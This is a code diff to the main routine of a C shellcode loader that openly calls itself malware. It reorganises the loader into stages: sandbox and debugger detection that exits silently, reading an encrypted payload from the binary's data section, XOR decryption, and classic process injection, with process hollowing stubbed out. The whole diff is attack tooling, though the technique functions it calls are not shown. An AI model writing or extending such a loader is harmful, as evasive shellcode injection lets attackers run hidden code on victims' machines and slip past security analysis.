@@ -2,6 +2,7 @@
 #include "core/utils.h"
 #include "techniques/T_encryption.h"
 #include "techniques/T_injection.h"
+#include "techniques/T_storage.h"
 #include "techniques/T_evasion.h"
 
 /*{{DEFINES}}*/
@@ -20,21 +21,6 @@ int main(void) {
 
     DEBUG_MSG("Start", "Hello from malware");
 
-    // --- STAGE 0: ENVIRONMENT CHECKS ---
-    #ifdef EVASION_CHECKS_ENABLED
-        DEBUG_MSG("Evasion", "Running environment checks...");
-        if (IsDebugged()) {
-            return 0; // Exit silently
-        }
-        if (IsSandboxed_Sleep()) {
-            return 0; // Exit silently
-        }
-        if (IsSandboxed_LowRam()) {
-            return 0; // Exit silently
-        }
-        DEBUG_MSG("Evasion", "Environment checks passed.");
-    #endif
-
     // --- Initialze ---
     #ifdef USE_DIRECT_SYSCALLS
         DEBUG_MSG("Initialze", "Initialze syscall...");
@@ -44,17 +30,26 @@ int main(void) {
         }
     #endif
 
-    // Stage 1 -> 4
-    DEBUG_MSG("Decrypt", "Decrypt shellcode...");
-    #ifdef ENCRYPTION_XOR
-        Decrypt_XOR(shellcode, shellcode_len, key);
+    // 1. STAGE 0: Anti-Analysis
+    #ifdef EVASION_CHECKS_ENABLED
+        if (!Stage0_Environment_Check()) return; // Exit if run in sandbox
     #endif
 
 
-    // Bước 3: Inject và thực thi
-    DEBUG_MSG("Execute", "Inject our shellcode...");
+    // 2. STAGE 1: Storage Access
+    PayloadInfo payload = Stage1_Access_DataSection();
+
+
+    // 3. STAGE 3 (Part A): Transformation
+    #ifdef ENCRYPTION_XOR
+        Stage3_Decrypt_XOR(&payload);
+    #endif
+
+    // 4. STAGE 2 + 3(Part B) + 4: Injection Recipe
     #ifdef INJECTION_CLASSIC
-        Inject_Classic(shellcode, shellcode_len);
+        Inject_Classic(payload.data, payload.length);
+    #elif defined(INJECTION_HOLLOWING)
+        // Inject_ProcessHollowing(payload.data, payload.length);
     #endif
 
     return 0;
